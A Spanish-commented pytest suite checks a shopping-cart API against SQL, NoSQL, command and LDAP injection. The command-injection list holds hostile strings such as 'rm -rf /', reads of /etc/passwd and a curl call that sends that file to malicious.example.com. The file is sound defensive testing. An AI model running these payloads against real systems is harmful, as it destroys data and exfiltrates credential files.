"""
Tests avanzados de inyeccion para la API del carrito de TiendaUV.

OWASP API8 — Injection
-----------------------
Esta categoria cubre ataques donde el atacante intenta que el servidor ejecute
datos del usuario como si fueran instrucciones (SQL, comandos del sistema,
expresiones LDAP, etc.).

Por que usamos SQLite en memoria en estos tests (no PostgreSQL real)
---------------------------------------------------------------------
Los tests de inyeccion verifican que el SERVIDOR no ejecuta el payload como
codigo. No necesitamos PostgreSQL real porque:
1. SQLAlchemy usa consultas parametrizadas tanto con SQLite como con PostgreSQL.
   La proteccion contra SQL injection es identica en ambas BD.
2. Los tests son mas rapidos sin Docker.
3. El riesgo de inyeccion esta en la capa de la aplicacion (como parsea los
   datos), no en el motor de BD.

Que son las consultas parametrizadas (la defensa principal contra SQL injection)
---------------------------------------------------------------------------------
En SQL sin parametrizar:
    query = "SELECT * FROM productos WHERE nombre = '" + nombre_del_usuario + "'"
Si el usuario envia: Laptop' OR '1'='1
El query resultante es:
    SELECT * FROM productos WHERE nombre = 'Laptop' OR '1'='1'
Esto retorna TODOS los productos porque '1'='1' es siempre verdadero.

Con consultas parametrizadas (SQLAlchemy):
    session.query(Producto).filter(Producto.nombre == nombre_del_usuario)
SQLAlchemy genera:
    SELECT * FROM productos WHERE nombre = ?
    parametros: ['Laptop\' OR \'1\'=\'1']
El motor de BD trata el valor completo como un string literal, sin interpretar
el SQL dentro de el. El apostrofe es un caracter mas del nombre.
"""

import pytest
from fastapi.testclient import TestClient

from src.carrito.api import app

client = TestClient(app)


class TestSQLInjectionAvanzado:
    """
    OWASP API8: SQL Injection con payloads variados.

    Cada payload fue documentado en incidentes reales de SQL injection.
    La proteccion de SQLAlchemy con consultas parametrizadas debe neutralizar
    todos sin que el servidor retorne 500.
    """

    # Payloads clasicos de SQL injection
    PAYLOADS_SQL = [
        "' OR '1'='1",                    # Boolean-based blind SQLi
        "'; DROP TABLE carritos; --",      # Stacked queries (destruccion de datos)
        "1' UNION SELECT NULL--",          # UNION-based SQLi (extraccion de datos)
        "' OR 1=1--",                      # Comment-style injection
        "'; INSERT INTO carritos VALUES (99, 'hacked'); --",  # Data insertion
        "' AND SLEEP(5)--",                # Time-based blind SQLi (deteccion de BD)
        "1; EXEC xp_cmdshell('whoami')--", # Command execution via SQL Server
        "' OR '1'='1' /*",                # Comment injection
        "admin'--",                        # Authentication bypass
    ]

    @pytest.mark.parametrize("payload", PAYLOADS_SQL)
    def test_sql_injection_en_nombre_no_causa_500(self, payload: str):
        """
        Cada payload SQL injection en el nombre del producto debe ser tratado
        como texto, nunca como SQL a ejecutar. La respuesta nunca debe ser 500.
        """
        response = client.post(
            "/carrito/test-sql-avanzado/productos",
            json={"nombre": payload, "precio": 100, "cantidad": 1},
        )
        assert response.status_code != 500, (
            f"SQL injection '{payload[:40]}...' causo error 500 — "
            "el servidor no manejo el input malicioso"
        )
        assert response.status_code in (201, 422), (
            f"Codigo de respuesta inesperado {response.status_code}"
        )

    @pytest.mark.parametrize("payload", PAYLOADS_SQL)
    def test_sql_injection_en_sesion_id_no_causa_500(self, payload: str):
        """
        El sesion_id es un parametro de ruta URL. Un atacante puede intentar
        inyectar SQL ahi tambien: GET /carrito/' OR '1'='1
        El framework debe tratar el sesion_id como string sin interpretarlo.
        """
        import urllib.parse

        sesion_codificado = urllib.parse.quote(payload, safe="")
        response = client.get(f"/carrito/{sesion_codificado}")
        assert response.status_code != 500, (
            f"SQL injection en sesion_id causo error 500 con payload: {payload[:40]}"
        )

    PAYLOADS_NOSQL = [
        '{"$gt": ""}',           # MongoDB NoSQL injection
        '{"$ne": null}',         # Not-equals injection
        '{"$where": "1==1"}',    # JavaScript injection via $where
        '{"$regex": ".*"}',      # Regex injection
    ]

    @pytest.mark.parametrize("payload_nosql", PAYLOADS_NOSQL)
    def test_nosql_patterns_tratados_como_texto(self, payload_nosql: str):
        """
        Aunque la API usa SQL (no MongoDB), probamos que los patrones NoSQL
        se traten como strings literales. Un servidor mal configurado que
        evalua expresiones en los campos podria ser vulnerable.
        """
        response = client.post(
            "/carrito/test-nosql/productos",
            json={"nombre": payload_nosql, "precio": 100, "cantidad": 1},
        )
        assert response.status_code != 500, (
            f"Patron NoSQL '{payload_nosql}' causo error 500"
        )

    PAYLOADS_COMMAND = [
        "; rm -rf /",
        "$(whoami)",
        "`cat /etc/passwd`",
        "| ls -la /",
        "&& curl http://malicious.example.com/steal?data=$(cat /etc/passwd)",
        "; ping -c 5 127.0.0.1",
    ]

    @pytest.mark.parametrize("payload_cmd", PAYLOADS_COMMAND)
    def test_command_injection_en_campos_texto(self, payload_cmd: str):
        """
        Command injection: el atacante intenta ejecutar comandos del sistema
        operativo a traves de campos de texto. La API no pasa estos valores
        a subprocess, exec() ni eval(), por lo que la proteccion es inherente
        al diseno (no hay donde inyectar). Este test confirma que nunca hay 500.
        """
        response = client.post(
            "/carrito/test-cmd/productos",
            json={"nombre": payload_cmd, "precio": 100, "cantidad": 1},
        )
        assert response.status_code != 500, (
            f"Command injection payload '{payload_cmd[:40]}' causo error 500"
        )

    PAYLOADS_LDAP = [
        "*)(uid=*))(|(uid=*",
        "*))(|(password=*)",
        "*)(|(mail=*))",
        "admin)(&(password=*))",
    ]

    @pytest.mark.parametrize("payload_ldap", PAYLOADS_LDAP)
    def test_ldap_patterns_como_texto(self, payload_ldap: str):
        """
        Patrones de LDAP injection: la API no usa LDAP, pero verificar que
        caracteres especiales de LDAP (parentesis, asteriscos) no rompen el servidor.
        """
        response = client.post(
            "/carrito/test-ldap/productos",
            json={"nombre": payload_ldap, "precio": 100, "cantidad": 1},
        )
        assert response.status_code != 500, (
            f"Patron LDAP '{payload_ldap}' causo error 500"
        )


class TestInyeccionIntegridadDatos:
    """
    Verifica que los datos inyectados se almacenan y retornan como texto literal,
    sin modificacion ni interpretacion.
    """

    def test_sql_injection_almacenado_como_texto_literal(self):
        """
        El payload SQL debe almacenarse tal cual y retornarse identico.
        Si el string retornado es diferente al enviado (por ejemplo, mas corto
        porque el servidor interpreto el '-- como inicio de comentario SQL),
        es una senal de que el input se mezclo con el SQL en algun punto.
        """
        payload = "' OR '1'='1"
        sesion = "test-integridad-sql"

        response = client.post(
            f"/carrito/{sesion}/productos",
            json={"nombre": payload, "precio": 100, "cantidad": 1},
        )

        if response.status_code == 201:
            r_get = client.get(f"/carrito/{sesion}")
            productos = r_get.json()["productos"]
            nombres = [p["nombre"] for p in productos]
            assert payload in nombres, (
                f"El payload fue almacenado como '{nombres}' en vez de '{payload}'. "
                "Posible interpretacion parcial del SQL injection."
            )
